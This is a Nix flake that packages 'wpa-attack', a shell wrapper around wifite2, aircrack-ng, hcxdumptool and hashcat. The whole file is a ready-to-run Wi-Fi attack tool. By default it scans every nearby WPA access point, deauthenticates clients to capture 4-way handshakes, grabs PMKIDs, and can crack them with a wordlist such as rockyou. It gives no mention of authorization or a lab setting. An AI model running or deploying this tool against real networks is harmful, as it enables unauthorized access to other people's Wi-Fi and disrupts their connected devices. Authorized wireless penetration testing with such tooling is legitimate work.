{
  description = "WPA/WPA2 attack testing with wifite2";

  inputs = {
    nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";
  };

  outputs = { self, nixpkgs }:
    let
      system = "x86_64-linux";
      pkgs = import nixpkgs { inherit system; };

      wpaAttack = pkgs.writeShellApplication {
        name = "wpa-attack";
        runtimeInputs = with pkgs; [
          aircrack-ng
          coreutils
          hashcat
          hcxdumptool
          hcxtools
          iproute2
          iw
          wifite2
        ];

        text = ''
          set -euo pipefail

          usage() {
            printf '%s\n' "Usage: wpa-attack <interface> [bssid] [output-dir]" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "  interface  : wireless interface (must support monitor mode)" >&2
            printf '%s\n' "  bssid      : target a specific AP (default: scan all WPA APs)" >&2
            printf '%s\n' "  output-dir : directory for handshakes and results (default: current dir)" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "Environment variables:" >&2
            printf '%s\n' "  WPA_MODE=both       handshake capture + PMKID (default)" >&2
            printf '%s\n' "  WPA_MODE=handshake  4-way handshake capture only (triggers deauth)" >&2
            printf '%s\n' "  WPA_MODE=pmkid      PMKID capture only (no deauth, no client required)" >&2
            printf '%s\n' "  WPA_TIMEOUT=300     seconds per target for handshake capture (default: 300)" >&2
            printf '%s\n' "  PMKID_TIMEOUT=150   seconds for PMKID capture attempt (default: 150)" >&2
            printf '%s\n' "  WORDLIST=<path>     wordlist to crack captured hashes immediately" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "Example: wpa-attack wlan1" >&2
            printf '%s\n' "Example: WPA_MODE=pmkid wpa-attack wlan1 AA:BB:CC:DD:EE:FF /tmp/wpa" >&2
            printf '%s\n' "Example: WORDLIST=/usr/share/wordlists/rockyou.txt wpa-attack wlan1" >&2
            exit 2
          }

          if [ "$#" -lt 1 ] || [ "$#" -gt 3 ]; then
            usage
          fi

          INTERFACE="$1"
          BSSID="''${2:-}"
          OUTPUT_DIR="''${3:-.}"
          WPA_MODE="''${WPA_MODE:-both}"
          WPA_TIMEOUT="''${WPA_TIMEOUT:-300}"
          PMKID_TIMEOUT="''${PMKID_TIMEOUT:-150}"
          WORDLIST="''${WORDLIST:-}"

          if [ "$(id -u)" -ne 0 ]; then
            printf '%s\n' "This tool must be run as root." >&2
            exit 1
          fi

          if ! ip link show "$INTERFACE" >/dev/null 2>&1; then
            printf '%s\n' "Interface does not exist: $INTERFACE" >&2
            exit 1
          fi

          if ! iw phy "$(iw dev "$INTERFACE" info | awk '/wiphy/{print "phy" $2}')" info \
               | grep -q '^\s*\* monitor'; then
            printf '%s\n' "Interface $INTERFACE does not support monitor mode." >&2
            exit 1
          fi

          for var in WPA_TIMEOUT PMKID_TIMEOUT; do
            val="$(eval echo "\$$var")"
            case "$val" in
              ""|*[!0-9]*)
                printf '%s\n' "$var must be a positive integer, got: $val" >&2
                exit 2
                ;;
            esac
          done

          if [ -n "$WORDLIST" ] && [ ! -f "$WORDLIST" ]; then
            printf '%s\n' "Wordlist not found: $WORDLIST" >&2
            exit 1
          fi

          mkdir -p "$OUTPUT_DIR"

          set -- -i "$INTERFACE" \
                 --wpa \
                 --wpat "$WPA_TIMEOUT" \
                 --pmkid-timeout "$PMKID_TIMEOUT" \
                 --hs-dir "$OUTPUT_DIR" \
                 --kill

          case "$WPA_MODE" in
            both)
              set -- "$@" --pmkid
              ;;
            handshake)
              set -- "$@" --no-pmkid
              ;;
            pmkid)
              set -- "$@" --pmkid --wpat 30
              ;;
            *)
              printf '%s\n' "WPA_MODE must be 'both', 'handshake', or 'pmkid'." >&2
              exit 2
              ;;
          esac

          if [ -n "$BSSID" ]; then
            set -- "$@" -b "$BSSID"
          fi

          if [ -n "$WORDLIST" ]; then
            set -- "$@" --crack --dict "$WORDLIST"
          fi

          printf '%s\n' "WPA/WPA2 attack"
          printf '%s\n' "  Interface     : $INTERFACE"
          printf '%s\n' "  Target        : ''${BSSID:-scan all WPA APs}"
          printf '%s\n' "  Mode          : $WPA_MODE"
          printf '%s\n' "  WPA timeout   : ''${WPA_TIMEOUT}s per target"
          printf '%s\n' "  PMKID timeout : ''${PMKID_TIMEOUT}s per target"
          printf '%s\n' "  Wordlist      : ''${WORDLIST:-none (capture only)}"
          printf '%s\n' "  Output        : $OUTPUT_DIR"
          printf '%s\n' "Press Ctrl+C to stop."

          wifite "$@"
        '';
      };

    in
    {
      packages.${system} = {
        wpa-attack = wpaAttack;
        default = wpaAttack;
      };

      apps.${system} = {
        default = {
          type = "app";
          program = "${wpaAttack}/bin/wpa-attack";
        };
      };
    };
}
